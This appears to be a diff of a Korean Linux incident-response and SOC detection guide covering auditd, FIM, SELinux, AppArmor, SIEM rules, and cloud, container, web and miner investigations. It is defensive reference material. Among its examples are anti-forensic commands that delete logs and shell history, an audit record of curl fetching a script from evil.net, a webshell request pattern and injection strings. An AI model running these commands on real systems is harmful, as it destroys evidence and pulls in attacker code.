+## 12. 로그·히스토리 삭제/은닉
+
+명령 예:
+```text
+rm /var/log/auth.log
+truncate -s 0 /var/log/auth.log
+sed -i '/203.0.113.5/d' /var/log/auth.log
+history -c
+shred -u ~/.bash_history
+```
+
+탐지:
+- 로그 크기 갑작스런 0
+- 시간 연속성 단절
+- journald/원격 syslog/SIEM과 불일치
+- auditd/FIM의 파일 변경 이벤트
+
+```bash
+stat /var/log/auth.log
+journalctl --since '-2 hours'
+ausearch -f /var/log/auth.log --start today 2>/dev/null
+```
+
+---
+
+## 13. LD_PRELOAD 및 환경변수 은닉
+
+```bash
+cat /proc/$PID/environ | tr '\0' '\n' | grep -E 'LD_PRELOAD|HISTFILE|HISTSIZE|HISTFILESIZE'
+```
+
+의심 예:
+```text
+LD_PRELOAD=/tmp/.lib.so
+HISTFILE=/dev/null
+HISTSIZE=0
+```
+
+LD_PRELOAD는 시스템 함수 후킹에 악용될 수 있으므로 해당 라이브러리 경로, hash, 프로세스 트리를 추가 조사한다.
+
+---
+
+## 14. IOC 추출
+
+IP:
+```bash
+grep -hE 'Failed|Accepted' /var/log/auth.log* 2>/dev/null \
+ | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u
+```
+
+URL 후보:
+```bash
+grep -hEi 'curl|wget' /var/log/audit/audit.log* 2>/dev/null \
+ | grep -oE 'https?://[^ "\047]+' | sort -u
+```
+
+파일 해시:
+```bash
+find /tmp /var/tmp /dev/shm -type f -exec sha256sum {} \; 2>/dev/null
+```
+
+---
+
+## 15. Alert triage 체크리스트
+
+1. 실행 주체(user/uid/euid)
+2. 부모 프로세스와 실행 경로
+3. command line의 download/encoding/hiding/background 요소
+4. 이후 파일 생성·권한 변경
+5. cron/service/key/account 지속성
+6. outbound/C2/lateral/exfiltration
+7. 승인된 배포·점검 여부
+8. 즉시 격리 필요 여부
+
+
+---
+
+## 06. auditd · FIM · SELinux · AppArmor
+
+## 1. auditd가 중요한 이유
+
+auditd는 커널 수준 감사 데이터를 기록하며 다음 행위를 추적할 수 있다.
+- `execve`, `open`, `write`, `unlink`, `chmod`, `chown`
+- 파일/디렉터리 접근
+- 사용자 인증·계정 관리
+- 권한/UID 변경
+- 네트워크 관련 syscall
+- SELinux/AppArmor 위반
+
+주의:
+- 규칙이 없으면 원하는 이벤트가 기록되지 않을 수 있다.
+- 과도한 syscall 감사는 로그량/성능 부담이 크다.
+- 디스크 부족 시 감사 중단 위험이 있어 auditd 저장 정책도 중요하다.
+
+상태:
+```bash
+systemctl status auditd
+auditctl -s
+auditctl -l
+```
+
+---
+
+## 2. audit 로그 이벤트 묶음
+
+하나의 실행 이벤트는 같은 `msg=audit(timestamp:serial)`을 공유하는 여러 레코드로 나타날 수 있다.
+
+### SYSCALL
+```text
+type=SYSCALL ... syscall=59 success=yes ppid=1234 pid=5678 uid=1001 auid=1001 ... exe="/usr/bin/curl"
+```
+
+### EXECVE
+```text
+type=EXECVE ... argc=3 a0="curl" a1="-fsSL" a2="http://evil.net/c.sh"
+```
+
+### PATH
+```text
+type=PATH ... name="/usr/bin/curl" inode=...
+```
+
+### PROCTITLE
+전체 command line이 hex 형태로 저장될 수 있다.
+
+`ausearch`는 같은 serial을 자동으로 묶어 보는 데 유용하다.
+
+---
+
+## 3. `ausearch` / `aureport`
+
+```bash
+# 특정 UID
+ausearch -ua 1001 --start today
+
+# 실행 파일
+ausearch -x /usr/bin/curl --start today
+
+# 감사 key
+ausearch -k ssh_key_change --start today
+
+# EXECVE 레코드
+ausearch -m EXECVE --start today
+
+# 인증 실패
+ausearch -m USER_AUTH -sv no --start today
+
+# sudoers 접근
+ausearch -f /etc/sudoers --start today
+```
+
+요약:
+```bash
+aureport --auth --summary
+aureport --auth --failed
+aureport --cmd --summary
+aureport --file --summary
+aureport --user --summary
+aureport --anomaly --start today
+```
+
+---
+
+## 4. 파일 감시 규칙
+
+> 규칙 추가는 시스템 상태 변경이다. 운영 적용 전 로그량을 검토한다.
 
 ```text
-01:55~02:05  SSH 실패 180회
-02:06        admin 로그인 성공
-02:08        sudo /bin/bash
-02:10        curl 외부 URL
-02:11        /tmp/.update 생성/실행
-02:13        systemd unit 생성
-02:14        신규 외부 연결
+-w /etc/passwd -p wa -k identity
+-w /etc/group -p wa -k identity
+-w /etc/shadow -p wa -k identity
+-w /etc/sudoers -p wa -k sudoers
+-w /etc/sudoers.d -p wa -k sudoers
+-w /etc/ssh/sshd_config -p wa -k sshd_config
 ```
 
-## 분석 순서
-
-### 1) 실패
-
+SSH key 예:
 ```bash
-sudo lastb -Fai | head -100
-grep -E 'Failed password|Invalid user' /var/log/auth.log
+auditctl -w /home/deploy/.ssh/authorized_keys -p wa -k ssh_key_change
 ```
 
-### 2) 성공
-
-```bash
-grep -E 'Accepted password|Accepted publickey' /var/log/auth.log
-last -Fai <USER>
-```
-
-### 3) 권한 상승
-
-```bash
-grep 'sudo:' /var/log/auth.log | grep '<USER>'
-journalctl _COMM=sudo --since "$START" --until "$END"
-```
-
-### 4) 실행/다운로드
-
-```bash
-sudo ausearch -ua <UID> -ts recent -i 2>/dev/null
-ps -eo user,pid,ppid,lstart,cmd --forest
-```
-
-### 5) 지속성
-
-```bash
-sudo find /root /home -path '*/.ssh/authorized_keys' -type f -exec stat -c '%y %n' {} \; 2>/dev/null
-sudo find /etc/cron.d /etc/systemd/system -type f -mmin -180 -ls 2>/dev/null
-systemctl list-timers --all
-```
-
-### 6) 네트워크
-
-```bash
-ss -plant
-ss -lntup
-```
-
-### 7) 파일
-
-```bash
-sudo find /tmp /var/tmp /dev/shm -type f -mmin -180 -ls 2>/dev/null
+권한 문자:
+```text
+r = read
+w = write
+x = execute
+a = attribute change
 ```
 
 ---
 
-# 23. SOC 판단 프레임워크
-
-## 낮은 위험도 예시
+## 5. syscall 감사 예시
 
 ```text
-내부 관리망 IP
-+ 정상 관리자
-+ 업무시간
-+ 승인된 변경 작업
-+ 평소 사용 명령
-+ 지속성/외부 연결 없음
+-a always,exit -F arch=b64 -S execve -k exec_log
+-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -k perm_change
+-a always,exit -F arch=b64 -S chown -S fchown -S fchownat -k owner_change
+-a always,exit -F arch=b64 -S setuid -S setreuid -S setresuid -k uid_change
 ```
 
-## 중간 위험도 예시
+모듈 로드:
+```text
+-a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -k modules
+```
+
+> `connect` 전수 감사는 환경에 따라 매우 많은 로그를 만들 수 있으므로 실제 적용은 서버 역할과 수집 용량을 고려한다.
+
+---
+
+## 6. 규칙 영구 적용
+
+보통:
+```text
+/etc/audit/rules.d/*.rules
+```
+
+로드:
+```bash
+augenrules --load
+auditctl -l
+```
+
+규칙 잠금 설정을 사용하는 환경에서는 변경 전 운영 절차가 필요하다.
+
+---
+
+## 7. 핵심 감사 대상
+
+### Identity
+```text
+/etc/passwd
+/etc/group
+/etc/shadow
+```
+
+### Privilege
+```text
+/etc/sudoers
+/etc/sudoers.d/
+SUID/SGID 및 chmod/chown
+```
+
+### SSH
+```text
+/etc/ssh/sshd_config
+/root/.ssh/authorized_keys
+/home/*/.ssh/authorized_keys
+```
+
+### Persistence
+```text
+/etc/cron.*
+/var/spool/cron
+/etc/systemd/system
+```
+
+### Kernel/rootkit 관련
+```text
+module load/unload
+insmod/modprobe/rmmod
+```
+
+---
+
+## 8. FIM(File Integrity Monitoring)
+
+핵심 감시:
+```text
+/etc/passwd /etc/shadow /etc/group
+/etc/ssh/* ~/.ssh/authorized_keys
+/etc/sudoers /etc/sudoers.d/*
+/etc/cron.* /var/spool/cron
+/etc/systemd/system
+/bin /sbin /usr/bin /usr/sbin
+/var/www/html
+```
+
+### AIDE
+```bash
+aide --check 2>&1 | grep -Ei 'changed|added|removed'
+```
+
+### auditd
+실시간 변경 사용자까지 추적 가능.
+
+### Wazuh/OSSEC
+FIM + 로그 분석 + alert 연계에 활용 가능.
+
+---
+
+## 9. SELinux
+
+모드:
+```bash
+getenforce
+sestatus
+```
 
 ```text
-정상 관리자
-+ 신규 IP
-+ 야간
-+ sudo 사용
-+ 명령은 관리 목적처럼 보임
-+ 승인 여부 불명
+Enforcing  = 정책 위반 차단 + 로그
+Permissive = 차단하지 않고 로그
+Disabled   = 비활성
 ```
 
-→ 관리자/작업 이력 확인이 필요.
+AVC 로그:
+```bash
+grep 'avc: *denied' /var/log/audit/audit.log | tail -50
+ausearch -m AVC --start today
+```
 
-## 높은 위험도 예시
+분석 필드:
+- `comm`: 요청 프로세스
+- `{ write }`, `{ read }`: 시도 권한
+- `scontext`: 프로세스 보안 컨텍스트
+- `tcontext`: 대상 컨텍스트
+- `tclass`: 객체 유형
+- `permissive=0`: enforcing에서 차단
+
+예를 들어 웹 프로세스가 평소 접근하지 않는 사용자 홈/임시 파일을 읽거나 쓰려 한 AVC는 웹쉘/침해 조사 단서가 될 수 있다.
+
+---
+
+## 10. AppArmor
+
+상태:
+```bash
+aa-status
+apparmor_status 2>/dev/null
+```
+
+프로파일:
+```text
+/etc/apparmor.d/
+```
+
+모드:
+```text
+enforce  = 차단 + 로그
+complain = 허용 + 로그
+```
+
+거부 이벤트:
+```bash
+grep -Ei 'apparmor="DENIED"|APPARMOR_DENIED' /var/log/syslog /var/log/audit/audit.log 2>/dev/null
+```
+
+분석 필드:
+- profile
+- operation
+- name/path
+- pid/comm
+- requested_mask / denied_mask
+
+---
+
+## 11. MAC 이벤트 triage
 
 ```text
-반복 SSH 실패
-→ 로그인 성공
-→ sudo/root shell
-→ curl/wget 다운로드
-→ /tmp 실행
-→ authorized_keys/cron/systemd 변경
-→ 신규 외부 IP 연결
+1. 실제 차단인가, permissive/complain 로그인가
+2. 어떤 프로세스가 무엇에 접근했는가
+3. 정상 업데이트/배포 이후 정책 불일치인가
+4. 웹/서비스 계정이 /tmp, user home, shell 파일 등에 접근했는가
+5. 같은 시각 auditd execve와 네트워크 연결이 있는가
 ```
 
-이 경우 각 이벤트가 독립적으로는 정상 가능성이 있어도 **공격 흐름으로 연결되면 침해 가능성이 크게 상승**한다.
+SELinux/AppArmor 거부 이벤트 자체만으로 공격을 확정하지 않는다. 정상 정책 미조정도 빈번하다.
+
 
 ---
 
-# 24. 분석 시 반드시 묻는 컨텍스트 5가지
+## 07. SIEM 탐지 룰 · UEBA · 로그 품질
 
-## 사용자
-- 일반 사용자/관리자/서비스 계정인가?
-- 계정 소유자가 현재 재직/근무 중인가?
-- 평소 이 서버에 접속하는가?
+## 1. 우선 구현할 Linux 탐지 유스케이스
 
-## 자산
-- 운영/개발/DB/웹/Bastion 중 무엇인가?
-- 인터넷 노출 여부는?
-- 중요 데이터가 있는가?
-
-## 시간
-- 업무시간인가?
-- maintenance window인가?
-- 정기 배치 시간과 겹치는가?
-
-## 네트워크
-- Bastion/VPN/관리망 IP인가?
-- 처음 보는 IP인가?
-- 서버 역할상 허용된 목적지인가?
-
-## 변경
-- 배포/패치/점검/비밀번호 변경이 있었는가?
-- 작업 티켓/승인 이력이 있는가?
+1. 동일 IP에서 다수 SSH 실패 후 10분 내 성공
+2. 신규 외부 IP에서 root/admin 로그인
+3. 야간 privileged 로그인 + sudo
+4. `curl/wget → /tmp → chmod +x → 실행`
+5. root cron에 외부 URL
+6. `authorized_keys` 변경 후 publickey 로그인
+7. `useradd → sudo/wheel → systemctl enable`
+8. `/tmp`, `/dev/shm` 실행 + 외부 연결
+9. 로그/history 삭제
+10. 민감 파일 접근 → 압축/외부 전송
 
 ---
 
-# 25. 자주 쓰는 원라이너 모음
+## 2. 탐지 룰 기본 필드
 
-## SSH 실패 IP Top 20
-
-```bash
-grep 'Failed password' /var/log/auth.log \
-  | sed -nE 's/.* from ([^ ]+).*/\1/p' \
-  | sort | uniq -c | sort -rn | head -20
+최소 정규화:
+```text
+@timestamp
+host / asset_id
+user / uid / auid / euid
+src_ip / src_port
+dst_ip / dst_port
+process_name / process_path
+parent_process
+command_line
+file_path
+event_action / outcome
 ```
 
-## SSH 성공 목록
-
-```bash
-grep -E 'Accepted (password|publickey)' /var/log/auth.log
-```
-
-## root 로그인
-
-```bash
-grep -E 'Accepted .* for root|Failed password for root' /var/log/auth.log
-```
-
-## sudo 위험 명령
-
-```bash
-grep 'sudo:' /var/log/auth.log \
-  | grep -Ei 'COMMAND=.*(bash|sh|useradd|usermod|passwd|chmod|chown|curl|wget|crontab|systemctl)'
-```
-
-## 최근 계정/그룹 변경
-
-```bash
-journalctl --since '24 hours ago' | grep -Ei 'useradd|usermod|userdel|passwd|groupadd|groupmod'
-```
-
-## 최근 systemd/cron 파일
-
-```bash
-sudo find /etc/systemd/system /etc/cron.d -type f -mtime -1 -ls 2>/dev/null
-```
-
-## 임시 경로 실행 파일
-
-```bash
-sudo find /tmp /var/tmp /dev/shm -type f -perm /111 -ls 2>/dev/null
-```
-
-## 삭제된 실행파일
-
-```bash
-sudo ls -l /proc/*/exe 2>/dev/null | grep '(deleted)'
-```
-
-## 외부 연결 포함 전체 TCP
-
-```bash
-ss -plant
-```
-
-## listening port
-
-```bash
-ss -lntup
-```
-
-## PID 상세
-
-```bash
-PID=<PID>; ps -fp "$PID"; tr '\0' ' ' < /proc/$PID/cmdline; echo; readlink -f /proc/$PID/exe; readlink -f /proc/$PID/cwd
-```
+상관분석에 필요한 추가 메타데이터:
+- 계정 유형: 일반/관리자/서비스
+- 자산 중요도와 역할
+- Bastion/VPN/관리망 IP 목록
+- 승인 작업/변경 티켓
+- 내부 저장소/배포 서버 목록
 
 ---
 
-# 26. 사건 유형별 빠른 플레이북
-
-## A. "SSH Brute Force" 알림
-
-1. 실패 횟수/IP/대상 계정 집계
-2. 같은 IP에서 성공이 있었는지 확인
-3. 성공 세션 시간 확인
-4. 직후 sudo/프로세스/파일/네트워크 확인
-5. 다른 서버에도 같은 IP가 접근했는지 SIEM에서 scope 확장
-
-핵심 명령:
-
-```bash
-grep '<IP>' /var/log/auth.log | grep -E 'Failed|Invalid|Accepted'
-last -Fai <USER>
-journalctl _COMM=sudo --since "$START" --until "$END"
-ss -plant
-```
-
----
-
-## B. "비정상 sudo" 알림
-
-1. 실행자/TTY/PWD/USER/COMMAND 확인
-2. 직전 로그인 출발지 확인
-3. 해당 사용자의 정상 업무인지 확인
-4. 명령이 계정/권한/지속성/다운로드에 연결되는지 확인
-5. 후속 프로세스와 네트워크 확인
-
-```bash
-grep 'sudo:.*<USER>' /var/log/auth.log
-last -Fai <USER>
-ps -eo user,pid,ppid,lstart,cmd --forest
-ss -plant
-```
-
----
-
-## C. "신규 계정 생성" 알림
-
-1. `useradd`/`usermod` 발생 시각
-2. 누가 생성했는지 auditd/sudo 확인
-3. sudo/wheel 추가 여부
-4. 비밀번호 설정 여부
-5. 생성 직후 로그인 여부
-6. SSH key/cron/systemd 등록 여부
-
-```bash
-getent passwd <USER>
-getent group sudo | grep '<USER>'
-getent group wheel | grep '<USER>'
-last -Fai <USER>
-sudo crontab -l -u <USER> 2>/dev/null
-sudo stat /home/<USER>/.ssh/authorized_keys 2>/dev/null
-```
-
----
-
-## D. "의심스러운 outbound 연결" 알림
-
-1. socket → PID
-2. PID → executable/command line
-3. PID → parent
-4. process user → 로그인 세션
-5. 파일 hash/mtime
-6. 지속성 여부
-
-```bash
-ss -plant | grep '<IP>'
-ps -fp <PID>
-tr '\0' ' ' < /proc/<PID>/cmdline; echo
-readlink -f /proc/<PID>/exe
-sha256sum <FILE>
-```
-
----
-
-## E. "systemd/cron 의심 이벤트" 알림
-
-1. unit/cron 파일 경로
-2. 생성/수정 시간
-3. 소유자/권한
-4. 실행 명령과 바이너리
-5. 누가 생성했는지 auditd/sudo
-6. 실행 후 네트워크 활동
-
-```bash
-stat <UNIT_OR_CRON_FILE>
-systemctl cat <SERVICE>
-journalctl -u <SERVICE> --since "$START" --until "$END"
-ss -plant
-```
-
----
-
-# 27. 에스컬레이션 시 기록해야 할 최소 정보
+## 3. 룰 설계 요소
 
 ```text
-[Alert]
-- 탐지명:
-- 최초 탐지 시각:
-- 탐지 소스:
+Selection      어떤 이벤트인가
+Aggregation    몇 회인가
+Time window    몇 분/시간 내인가
+Sequence       어떤 순서인가
+Exception      정상 Bastion/서비스계정/배포 서버인가
+Severity       영향도/신뢰도
+Playbook       다음 분석·조치가 무엇인가
+```
 
-[Asset]
-- Hostname:
-- IP:
-- 서버 역할:
-- 중요도:
+단순 문자열 탐지보다 sequence 탐지가 신뢰도가 높다.
 
-[Identity]
-- User:
-- UID/AUID:
-- Privilege:
-
-[Access]
-- Source IP:
-- Auth method: password/publickey/etc.
-- Bastion/VPN 경유 여부:
-- Fail → Success 여부:
-
-[Execution]
-- Command line:
-- PID / PPID:
-- Executable path:
-- Hash:
-
-[Persistence]
-- authorized_keys:
-- cron:
-- systemd:
-- account/group changes:
-
-[Network]
-- Destination IP/Port:
-- Listening ports:
-
-[Timeline]
-- T0:
-- T1:
-- T2:
-
-[Assessment]
-- 정상 근거:
-- 의심 근거:
-- 침해 가능성: Low / Medium / High
-- 추가 필요한 확인:
+```text
+Failed SSH × N
+→ Accepted SSH
+→ sudo root
+→ curl/wget
+→ chmod +x
+→ outbound
 ```
 
 ---
 
-# 28. 현장 조사 시 주의사항
+## 4. UEBA 관점
 
-- 침해 의심 파일을 직접 실행하지 않는다.
-- 증거 수집 전에 `history -c`, 로그 삭제, 서비스 재시작 같은 행위를 하지 않는다.
-- 실제 차단/계정 잠금/프로세스 kill은 조직의 IR 절차에 따라 수행한다.
-- 명령 실행 자체도 시스템 상태를 조금씩 변화시킬 수 있으므로 중요한 사고에서는 DFIR/IR 절차와 증거 보존 정책을 우선한다.
-- 호스트 로그가 없다고 이벤트가 없었다고 판단하지 않는다. SIEM, journald, auditd, EDR, Bastion/VPN, 네트워크 로그까지 확장한다.
-- 공격자는 정상 관리 도구(`curl`, `ssh`, `systemctl`, `python`)를 그대로 사용할 수 있다. **도구명보다 컨텍스트와 행위 체인**을 본다.
+### 시간 이상
+- 평소 주간 계정이 새벽 로그인
+
+### 위치/네트워크 이상
+- 기존 관리망이 아닌 신규 출발지
+
+### 행동 이상
+- 배치 서비스 계정이 `sudo`, `ssh`, `curl`, `bash`
+
+### 자산 이상
+- DB 서버에서 `useradd`
+- 웹 서버에서 내부 대역 `nmap`
+
+### 데이터 접근 이상
+- 업무 외 시간 민감 경로 접근
+- 대량 `find`, `tar`, `scp`
+
+주의:
+- baseline이 약하면 오탐이 폭증한다.
+- 새 직원, 장애 대응, 배포 같은 정상 변화도 이상치로 나타난다.
 
 ---
 
-# 29. 가장 중요한 공격 흐름 한 줄 요약
+## 5. 로그 품질이 탐지 품질을 결정한다
 
-```text
-Authentication → Session → Privilege → Execution → Persistence → Network → Scope
+### 시간 동기화
+```bash
+timedatectl status
+date && date -u
+chronyc tracking 2>/dev/null || ntpq -p 2>/dev/null
 ```
 
-SOC 분석은 결국 아래 질문을 연결하는 작업이다.
-
+### 파싱 검증
+샘플 raw 로그와 SIEM 필드를 비교:
 ```text
-누가 로그인했는가?
-→ 어디서 왔는가?
-→ 어떤 권한을 얻었는가?
-→ 무엇을 실행했는가?
-→ 무엇을 남겼는가?
-→ 어디와 통신했는가?
-→ 다른 자산/계정까지 확장되었는가?
+raw user     == parsed user ?
+raw src IP   == source.ip ?
+COMMAND=...  == process.command_line ?
+hostname     == asset inventory ?
 ```
 
-**단일 이벤트보다 이 연결 관계가 침해 판단의 핵심이다.**
+### 수집 파이프라인
+```text
+수집 → 파싱/정규화 → 메타데이터 보강 → 탐지 → triage/SOAR
+```
+
+탐지 문제처럼 보여도 실제 원인은:
+- 로그 미수집
+- parser mismatch
+- timezone 오류
+- hostname 불일치
+- rotation 파일 누락
+- agent backlog
+일 수 있다.
+
+---
+
+## 6. Elastic/KQL 예시
+
+> 실제 필드명은 ECS/수집 파서에 맞춰 조정한다.
+
+외부 SSH 성공:
+```text
+process.name : "sshd" and message : "Accepted" and not source.ip : (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16)
+```
+
+신규 사용자 생성 후보:
+```text
+process.name : ("useradd" or "usermod")
+```
+
+SSH key 변경:
+```text
+file.path : *authorized_keys and event.action : (creation or change or modification)
+```
+
+curl/wget 실행:
+```text
+process.name : (curl or wget)
+```
+
+---
+
+## 7. Splunk SPL 예시
+
+### 실패 IP 상위
+```spl
+index=linux_auth "Failed password"
+| rex "from (?<src_ip>\\S+)"
+| stats count by src_ip
+| sort - count
+| head 20
+```
+
+### sudo 명령 빈도
+```spl
+index=linux_auth "sudo:" "COMMAND="
+| rex "USER=(?<target_user>\\S+)\\s*;\\s*COMMAND=(?<cmd>.*)"
+| stats count by user target_user cmd
+| sort - count
+```
+
+### 야간 성공 로그인
+```spl
+index=linux_auth "Accepted"
+| eval hour=tonumber(strftime(_time,"%H"))
+| where hour<6 OR hour>=22
+| table _time host user src_ip _raw
+```
+
+### 실패 후 성공: 개념 예시
+```spl
+index=linux_auth ("Failed password" OR "Accepted password" OR "Accepted publickey")
+| rex "from (?<src_ip>\\S+)"
+| eval outcome=if(match(_raw,"Accepted"),"success","failure")
+| stats values(outcome) as outcomes count by src_ip user
+| where mvfind(outcomes,"failure")>=0 AND mvfind(outcomes,"success")>=0
+```
+
+> 실제 운영 룰은 시간창과 이벤트 순서를 명시해 sequence/correlation으로 구현하는 것이 좋다.
+
+---
+
+## 8. Sigma 룰 사고방식
+
+```yaml
+title: Suspicious SSH Failure Then Success
+status: experimental
+logsource:
+  product: linux
+  service: sshd
+detection:
+  failure:
+    message|contains: 'Failed password'
+  success:
+    message|contains: 'Accepted'
+  condition: failure or success
+level: medium
+```
+
+Sigma 자체는 "20회 실패 후 10분 내 성공" 같은 복잡한 상관 조건을 SIEM 백엔드 특성에 맞춰 보완해야 할 수 있다.
+
+중요한 것은 룰 이름보다 필드 정규화와 예외 처리가 일관적인가이다.
+
+---
+
+## 9. Grok 파싱 예시
+
+SSH 성공:
+```text
+%{SYSLOGTIMESTAMP:timestamp} %{HOSTNAME:host} sshd\[%{POSINT:pid}\]: Accepted %{WORD:auth_method} for %{USERNAME:username} from %{IP:src_ip} port %{POSINT:src_port}
+```
+
+sudo:
+```text
+%{USERNAME:username} : TTY=%{DATA:tty} ; PWD=%{DATA:pwd} ; USER=%{USERNAME:target_user} ; COMMAND=%{GREEDYDATA:command}
+```
+
+운영에서는 실제 샘플 로그 여러 형태를 대상으로 파서 테스트가 필요하다.
+
+---
+
+## 10. SOAR 자동화 경계
+
+자동화 적합:
+- IP reputation/TI 조회
+- 내부/외부/Bastion 태깅
+- 계정·자산 중요도 보강
+- 최근 SSH/sudo/cron 관련 로그 수집
+- 티켓 생성과 evidence 첨부
+
+사람 검토가 필요한 조치:
+- 계정 잠금
+- 세션 강제 종료
+- 방화벽 차단
+- 호스트 격리
+- 운영 서버 서비스 중단
+
+---
+
+## 11. 대시보드 구성
+
+### 1층: 상태
+- 시간별 SSH 성공/실패
+- 실패 상위 IP
+- privileged 성공 로그인
+- 신규 출발지 로그인
+
+### 2층: 행위
+- sudo 상위 명령
+- `/tmp`/`/dev/shm` 실행
+- 신규 계정/서비스/cron
+- auditd 고위험 key
+- outbound/C2 후보
+
+### 3층: 품질
+- agent heartbeat
+- ingest lag
+- parser failure
+- NTP/timezone mismatch
+- host별 auditd 수집량
+
+---
+
+## 12. 오탐 줄이는 질문
+
+```text
+이 IP는 Bastion/배포 서버인가?
+이 계정은 원래 이 호스트에 접속하는가?
+이 명령은 과거에도 반복되는가?
+내부 artifact repository에서 받은 파일인가?
+change ticket / maintenance window와 일치하는가?
+이 프로세스가 원래 외부 연결하는가?
+```
+
+**행위 + 맥락 + 시퀀스**를 함께 만족할수록 severity를 높인다.
+
+
+---
+
+## 08. 특수 환경: AWS · 컨테이너 · 웹 · Rootkit · 공급망 · Miner
+
+## 1. AWS EC2 사고 분석
+
+Linux 호스트 로그만 보지 말고 AWS control plane/network 로그와 결합한다.
+
+### CloudTrail
+확인 대상:
+- IAM API 호출
+- EC2 시작/중지
+- Security Group 변경
+- Role/Policy 변경
+- 액세스 키·세션 관련 행위
+
+### VPC Flow Logs
+확인:
+- 의심 외부 destination
+- 비정상 outbound
+- 내부 lateral movement 후보
+
+### Systems Manager Session Manager
+SSH가 아닌 관리 세션이 있을 수 있으므로 SSM 접근 이력도 확인한다.
+
+### Instance Role / Metadata
+EC2의 instance profile 자격증명은 침해 후 다른 AWS 서비스 접근에 악용될 수 있다.
+
+분석 흐름:
+```text
+Linux auth/auditd
+↔ CloudTrail IAM/API
+↔ VPC Flow Logs
+↔ SSM Session
+```
+
+핵심 질문:
+- 서버 침해가 AWS IAM 권한 침해로 확장되었는가
+- 해당 role로 접근 가능한 S3/Secrets/KMS 등의 범위는 어디까지인가
+
+---
+
+## 2. Docker 환경
+
+컨테이너 로그:
+```bash
+docker logs <container-id>
+docker logs --since 1h <container-id>
+```
+
+이벤트:
+```bash
+docker events --since 1h
+```
+
+현재 컨테이너:
+```bash
+docker ps --no-trunc
+```
+
+확인:
+- `docker exec`로 shell 접근
+- `--privileged`
+- host filesystem mount
+- container 삭제로 로그가 사라졌는가
+- 호스트 auditd/daemon 로그에 생성·exec 흔적이 있는가
+
+> 컨테이너의 root와 호스트 root는 원칙적으로 다르지만 privileged/mount/취약점 맥락에서는 host 침해 가능성을 확인한다.
+
+---
+
+## 3. Kubernetes 환경
+
+애플리케이션 로그:
+```bash
+kubectl logs <pod>
+kubectl logs <pod> -c <container> --since=1h
+kubectl logs <pod> --previous
+```
+
+컨테이너 shell:
+```bash
+kubectl exec -it <pod> -- /bin/sh
+```
+
+조사 시:
+- Kubernetes API audit log의 `exec`, `create pod`, `patch`, `secret access`
+- ServiceAccount 권한
+- privileged pod / hostPath / hostNetwork
+- pod 삭제 전 로그 중앙 수집 여부
+
+호스트의 `auth.log`만으로 `kubectl exec` 전체를 파악하기 어렵기 때문에 Kubernetes audit 로그가 중요하다.
+
+---
+
+## 4. 웹 서버 접근 로그
+
+nginx 예:
+```text
+198.51.100.5 - - [12/Jan/2024:03:15:20 +0900] "GET /wp-admin/... HTTP/1.1" 404 ...
+```
+
+고위험 흐름:
+```text
+POST /uploads/shell.php 200
+→ GET /uploads/shell.php?cmd=id 200
+→ nginx/php-fpm → sh/bash → curl
+```
+
+4xx 분포:
+```bash
+awk '{print $9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn
+```
+
+공격 패턴 후보:
+- traversal: `../`, `%2e%2e`
+- SQLi: `UNION SELECT`, `OR 1=1`
+- LFI: `/etc/passwd`, `/proc/self/...`
+- 짧은 시간의 다수 404/403
+
+웹 로그와 host process/auditd를 연결하는 것이 핵심이다.
+
+---
+
+## 5. Rootkit / 은닉
+
+유형:
+- 커널 rootkit: LKM 등으로 커널 수준 은닉
+- user-space rootkit: 라이브러리/도구 후킹
+- bootkit: bootloader 영역
+
+도구:
+```bash
+rkhunter --check --skip-keypress
+chkrootkit
+lsmod
+```
+
+현재 모듈:
+```bash
+lsmod
+cat /proc/modules
+```
+
+확인:
+- 모듈 로드 시점
+- `insmod`, `modprobe`, `init_module` audit 이벤트
+- `ps/ss/ls` 결과와 `/proc`, EDR 관측의 불일치
+- `LD_PRELOAD` 이상
+
+> rootkit 탐지는 단일 스캐너 결과로 확정하지 않고 무결성 기준·메모리/EDR·known-good 시스템과 비교한다.
+
+---
+
+## 6. 공급망 공격
+
+경로:
+- apt/pip/npm 등 패키지 변조
+- CI/CD 배포 스크립트 변조
+- 배포 서버 침해 후 다수 서버 전파
+
+Linux 탐지 관점:
+```text
+배포 직후 여러 서버에서 동일 시간대 동일 명령
+설치 스크립트 직후 curl/wget 외부 연결
+배포 대상이 아닌 서버까지 같은 IOC
+패키지 설치 프로세스 하위에서 shell/network tool 실행
+```
+
+핵심은 단일 서버가 아니라 **fleet-wide 동시성**이다.
+
+---
+
+## 7. Crypto Miner
+
+의심 패턴:
+```text
+/tmp 또는 /dev/shm 실행 파일
+nohup + /dev/null
+cron 지속성
+CPU 장시간 고사용
+마이닝 풀/stratum 연결
+```
+
+프로세스:
+```bash
+top
+ps aux --sort=-%cpu | head -20
+```
+
+의심 문자열 후보:
+```bash
+ps auxww | grep -Ei 'xmrig|minerd|minergate' | grep -v grep
+```
+
+네트워크:
+```bash
+ss -tnp
+```
+
+확인:
+- CPU만 높다고 miner로 확정하지 않는다.
+- 실행 경로, parent, command line, destination, cron을 함께 본다.
+
+---
+
+## 8. 웹/컨테이너/클라우드 공통 사고 질문
+
+```text
+초기 접근점은 어디인가?
+호스트 권한으로 확장되었는가?
+자격증명/토큰/Instance Role이 유출되었는가?
+다른 서버·Pod·AWS 서비스로 이동했는가?
+로그가 호스트 외 중앙 저장소에 남아 있는가?
+같은 이미지/패키지/배포물로 다른 자산도 영향받았는가?
+```
+
+이 질문으로 host 단위 분석을 환경 전체 영향도 분석으로 확장한다.
